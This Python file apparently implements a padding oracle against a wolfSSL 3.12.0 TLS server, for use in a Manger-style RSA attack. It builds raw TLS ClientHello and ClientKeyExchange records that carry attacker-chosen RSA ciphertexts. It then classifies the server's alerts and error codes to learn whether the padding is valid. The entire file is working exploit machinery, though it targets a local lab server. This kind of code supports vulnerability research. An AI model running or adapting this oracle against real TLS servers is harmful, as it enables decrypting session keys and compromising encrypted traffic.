import subprocess
import os
import socket
from Crypto.PublicKey import RSA
import math
import multiprocessing
from oracles import Oracle


SERVER_LOADTIME = 0.01


def get_rsa_from_pub_key_cert(path_to_cert):
    with open(path_to_cert, "r") as cert:
        key = RSA.importKey(cert.read())
    return key.n, key.e


class ServerDidntLoad(Exception):
    pass


def get_public_constants(path_to_public_server_cert, quiet=True):
    public_constants = dict()
    public_constants["N"], public_constants["e"] = get_rsa_from_pub_key_cert(path_to_public_server_cert)
    N = public_constants["N"]
    e = public_constants["e"]
    modulus_bits = int(math.ceil(math.log(N, 2)))
    modulus_bytes = public_constants["modulus_bytes"] = (modulus_bits + 7) // 8
    if not quiet:
        print("RSA N: %s" % hex(N))
        print("RSA e: %s" % hex(e))
        print("Modulus size: %i bits, %i bytes" % (modulus_bits, modulus_bytes))

    public_constants["cke_2nd_prefix"] = bytearray.fromhex(
        "{0:0{1}x}".format(modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2,
                                                                             6) + "{0:0{1}x}".format(modulus_bytes, 4))
    aes256_sha_string = "1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004003500ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203"
    ch_aes256_sha_string = bytearray.fromhex(aes256_sha_string)
    public_constants["ch"] = ch_aes256_sha_string
    public_constants["MSG_FASTOPEN"] = 0x20000000
    public_constants["ccs"] = bytearray.fromhex("000101")
    public_constants["enc"] = bytearray.fromhex(
        "005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0")
    public_constants["enable_fastopen"] = os.path.exists("/proc/sys/net/ipv4/tcp_fastopen")

    public_constants["pad_len"] = pad_len = (modulus_bytes - 48 - 3) * 2
    public_constants["rnd_pad"] = ("abcd" * (pad_len // 2 + 1))[:pad_len]

    return public_constants


class ClientProcess(multiprocessing.Process):
    def __init__(self, server_port, question, public_constants, child_conn):
        multiprocessing.Process.__init__(self)
        self.question = question
        self.server_port = server_port
        self.public_constants = public_constants
        self.child_conn = child_conn

    @staticmethod
    def get_alert_from_server(s):
        try:
            alert = s.recv(4096)
            s.close()
            if len(alert) == 0:
                return "No data received from server"
            if alert[0] == 0x15:
                if len(alert) < 7:
                    return "TLS alert was truncated (%s)" % (repr(alert))
                return "TLS alert %i of length %i" % (alert[6], len(alert))
            else:
                return "Received something other than an alert (%s)" % (alert[0:10])
        except socket.error as e:
            s.close()
            return str(e)
        except socket.timeout:
            s.close()
            return "Timeout waiting for alert"
        return False

    def oracle(self, ip, port, question, timeout=2, shortenedmessageflow=True, quiet=True):
        ch = self.public_constants["ch"]
        MSG_FASTOPEN = self.public_constants["MSG_FASTOPEN"]
        cke_2nd_prefix = self.public_constants["cke_2nd_prefix"]
        ccs = self.public_constants["ccs"]
        enc = self.public_constants["enc"]
        enable_fastopen = self.public_constants["enable_fastopen"]

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            if not enable_fastopen:
                s.connect((ip, port))
                s.sendall(ch)
            else:
                # ch is client hello
                s.sendto(ch, MSG_FASTOPEN, (ip, port))
            s.settimeout(timeout)
            buf = bytearray.fromhex("")
            i = 0
            bend = 0
            while True:
                # we try to read twice
                while i + 5 > bend:
                    buf += s.recv(4096)
                    if not quiet:
                        print("received")
                    bend = len(buf)
                # this is the record size
                psize = buf[i + 3] * 256 + buf[i + 4]
                # if the size is 2, we received an alert
                if (psize == 2):
                    s.close()
                    return ("The server sends an Alert after ClientHello")
                # try to read further record data
                while i + psize + 5 > bend:
                    buf += s.recv(4096)
                    if not quiet:
                        print("received 2")
                    bend = len(buf)
                # check whether we have already received a ClientHelloDone
                if (buf[i + 5] == 0x0e) or (buf[bend - 4] == 0x0e):
                    break
                i += psize + 5
            cke_version = buf[9:11]
            # client key exchange
            s.send(bytearray(b'\x16') + cke_version)
            s.send(cke_2nd_prefix)
            s.send(question)
            if not shortenedmessageflow:
                s.send(bytearray(b'\x14') + cke_version + ccs)
                s.send(bytearray(b'\x16') + cke_version + enc)
            alert = self.get_alert_from_server(s)
            if alert:
                if not quiet:
                    print("printing alert")
                    print(alert)
                return alert
            s.close()

        except ConnectionError:
            raise ConnectionError

        except Exception as e:
            s.close()
            return str(e)

    def ask_oracle(self, ip, port, question, timeout=2, quiet=True, check_valid_format=False):
        N = self.public_constants["N"]
        e = self.public_constants["e"]
        modulus_bytes = self.public_constants["modulus_bytes"]
        rnd_pad = self.public_constants["rnd_pad"]
        question_bytes = question.to_bytes(modulus_bytes, byteorder="big")

        connected = False

        while not connected:
            try:
                answer = self.oracle(ip, port, question_bytes, timeout=timeout, quiet=quiet)
            except ConnectionError:
                continue

            connected = True

        return answer

    @staticmethod
    def client_error_handler(alert_string):
        if "timed out" in alert_string:
            return True
        if "Connection refused" in alert_string:
            raise ConnectionError
        return False

    def client_process(self, question, ip="127.0.0.1", port=11111, quiet=True, check_valid_format=False):
        answer = self.ask_oracle(ip, port, question, timeout=1, quiet=quiet, check_valid_format=check_valid_format)
        result = self.client_error_handler(answer)
        return result

    def run(self):
        self.child_conn.send(
            self.client_process(self.question, port=self.server_port, check_valid_format=True, quiet=False))
        self.child_conn.close()


class ServerProcess(multiprocessing.Process):
    path_to_server_public_key = "/home/lubuntu/wolfssl-3.12.0-stable/certificates/server-public-key.pem"
    path_to_server_private_key = "/home/lubuntu/wolfssl-3.12.0-stable/certificates/server-private-key.pem"
    path_to_ca_public_cert = "/home/lubuntu/wolfssl-3.12.0-stable/certificates/ca-public-key.pem"

    wolfssl_root_dir = "/home/lubuntu/wolfssl-3.12.0-stable"

    def __init__(self, server_port, child_conn):
        multiprocessing.Process.__init__(self)
        self.output = None
        self.server_port = server_port
        self.child_conn = child_conn

    @staticmethod
    def server_error_handler(alert_string):
        if "-201" in alert_string:
            return False
        return True

    def run(self):
        server_run_command = ['sh',
                            './examples/server/server', '-c', ServerProcess.path_to_server_public_key,
                              '-k', ServerProcess.path_to_server_private_key,
                              '-A', ServerProcess.path_to_ca_public_cert,
                              '-p', str(self.server_port),
                              '-d', '-i']

        cwd = os.getcwd()
        os.chdir(self.wolfssl_root_dir)

        try:
            self.output = subprocess.check_output(server_run_command)
        except subprocess.CalledProcessError as e:
            self.output = e.stdout.decode('utf-8')

        os.chdir(cwd)
        server_answer = ServerProcess.server_error_handler(self.output)
        self.child_conn.send(server_answer)
        self.child_conn.close()


def is_correct_padding(server_port, question, public_constants):
    parent_conn_client, child_conn_client = multiprocessing.Pipe()
    parent_conn_server, child_conn_server = multiprocessing.Pipe()

    serverp = ServerProcess(server_port, child_conn_server)
    clientp = ClientProcess(server_port, question, public_constants, child_conn_client)

    serverp.start()
    clientp.start()

    serverp.join()
    clientp.join()

    client_oracle_answer = parent_conn_client.recv()
    server_oracle_answer = parent_conn_server.recv()

    return client_oracle_answer or server_oracle_answer


class MangerOracle(Oracle):
    def __init__(self, server_port, public_constants):
        self.server_port = server_port
        self.public_constants = public_constants
        self.N = public_constants["N"]
        self.e = public_constants["e"]

    def query(self, question):
        return is_correct_padding(self.server_port, question, self.public_constants)


def main(server_port, question):
    path_to_server_public_key = "/home/lubuntu/wolfssl-3.12.0-stable/certificates/server-public-key.pem"
    public_constants = get_public_constants(path_to_server_public_key)
    manger_oracle = MangerOracle(server_port, public_constants)
    return manger_oracle.query(question)
